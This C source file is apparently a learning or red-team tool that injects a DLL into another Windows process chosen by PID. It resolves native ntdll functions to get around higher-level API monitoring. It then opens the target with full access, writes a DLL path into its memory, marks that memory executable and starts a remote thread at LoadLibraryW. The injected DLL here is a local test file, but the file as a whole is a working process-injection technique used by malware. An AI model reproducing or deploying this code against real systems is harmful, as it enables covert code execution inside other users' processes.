#include <Windows.h>
#include <stdio.h>
#include "header.h"


int main(int argc, char  *argv[])
{
    HANDLE hProc     =       NULL;
    HANDLE hThread   =       NULL;
    HMODULE k32      =       NULL;
    HMODULE hNt      =       NULL;
    PVOID rBuffer    =       NULL;
    DWORD pID     = atoi(argv[1]);
    DWORD tID     =             0;
    DWORD OldProtect;
    NTSTATUS status;
    wchar_t dll_path[MAX_PATH]    =  L"c:\\Users\\callu\\projects\\test\\hello.dll";
    size_t dll_len = sizeof(dll_path);
    size_t bytes_ret;
    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
    CLIENT_ID CId = { (HANDLE)pID, NULL };

    info("Loading kernel32...");
    info("Loading NtDLL.dll...");
    k32 = GetMod(L"kernel32.dll");
    hNt = GetMod(L"ntdll.dll");
    if ( k32 == NULL || hNt == NULL) {
        error("Failed Loading DLL(s)\tCode: 0x%ld", GetLastError());
        return EXIT_FAILURE;
    }
    okay("[Kernel32.dll]\n\\____0x%p", k32);
    okay("[ntdll.dll]\n\\_____0x%p\n", hNt);
    //==============================================================================================================
    info("Getting Addresses...");
    LPTHREAD_START_ROUTINE LoadLib = (LPTHREAD_START_ROUTINE)GetProcAddress(k32, "LoadLibraryW");
    printf("[LoadLibraryW]\n\\________0x%p\n", LoadLib);

    NtCreateThreadEx pCreathread = (NtCreateThreadEx)GetProcAddress(hNt, "NtCreateThreadEx");
    printf("[NtCreateThreadEx]\n\\_________0x%p\n", pCreathread);

    NtOpenProcess pOpenProcess = (NtOpenProcess)GetProcAddress(hNt, "NtOpenProcess");
    printf("[NtOpenProcess]\n\\__________0x%p\n", pOpenProcess);

    NtAllocateVirtualMemory pAllocateMemory = (NtAllocateVirtualMemory)GetProcAddress(hNt, "NtAllocateVirtualMemory");
    printf("[NtAllocateVirtualMemory]\n\\___________0x%p\n", pAllocateMemory);

    NtWriteVirtualMemory pWriteMemory = (NtWriteVirtualMemory)GetProcAddress(hNt, "NtWriteVirtualMemory");
    printf("[NtWriteVirtualMemory]\n\\____________0x%p\n", pWriteMemory);

    NtProtectVirtualMemory pVirtualProtect = (NtProtectVirtualMemory)GetProcAddress(hNt, "NtProtectVirtualMemory");
    printf("[NtProtectVirtualMemory]\n\\_____________0x%p\n", pVirtualProtect);

    NtWaitForSingleObject pWaitObject = (NtWaitForSingleObject)GetProcAddress(hNt, "NtWaitForSingleObject");
    printf("[NtWaitForSingleObject]\n\\______________0x%p\n", pWaitObject);

    NtClose pClose = (NtClose)GetProcAddress(hNt, "NtClose");
    printf("[NtClose]\n\\_______________0x%p\n", pClose);
    //===============================================================================================================
    info("Getting Handle To [%ld]", pID);
    status = pOpenProcess(&hProc, PROCESS_ALL_ACCESS, &OA, &CId);
    if (!StatusCheck(status)) {
        error("Failed Getting Handle\tCode: 0x%ld", GetLastError());
        return EXIT_FAILURE;
    }
    okay("Got Handle\n\\_____0x%p\n", hProc);

    info("Allocating Buffer of %d-bytes", dll_len);
    status = pAllocateMemory(hProc, &rBuffer, NULL, &dll_len, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
    if (!StatusCheck(status)) {
        error("Failed Allocating Buffer\tCode: 0x%ld", GetLastError());
        return EXIT_FAILURE;
    }
    okay("Allocated A Buffer [RW-]\n\\______0x%p\n", rBuffer);

    info("Writing Into Buffer...");
    status = pWriteMemory(hProc, rBuffer, dll_path, sizeof(dll_path), &bytes_ret);
    if (!StatusCheck(status)) {
        error("Failed Writing Memory\tCode: 0x%ld", GetLastError());
        return EXIT_FAILURE;
    }
    info("Wrote %d-Bytes Into buffer\n", bytes_ret);

    status = pVirtualProtect(hProc, &rBuffer, &dll_len, PAGE_EXECUTE_READ, &OldProtect);
    if(!StatusCheck(status)) {
        error("Failed Changing Perms");
        return EXIT_FAILURE;
    }
    okay("Changed Perms [R-X]\n");

    info("Starting Thread...");
    status = pCreathread(&hThread, THREAD_ALL_ACCESS, &OA, hProc, LoadLib, rBuffer, FALSE, 0, 0 , 0, 0);
    if (!StatusCheck(status)) {
        error("Failed Creating Thread\tCode: 0x%ld", GetLastError());
        return EXIT_FAILURE;
    }
    okay("Started Thread\n\\______0x%p\n", hThread);

    pWaitObject(hThread, FALSE, NULL);

    pClose(hProc);
    pClose(hThread);
    return EXIT_SUCCESS;
}
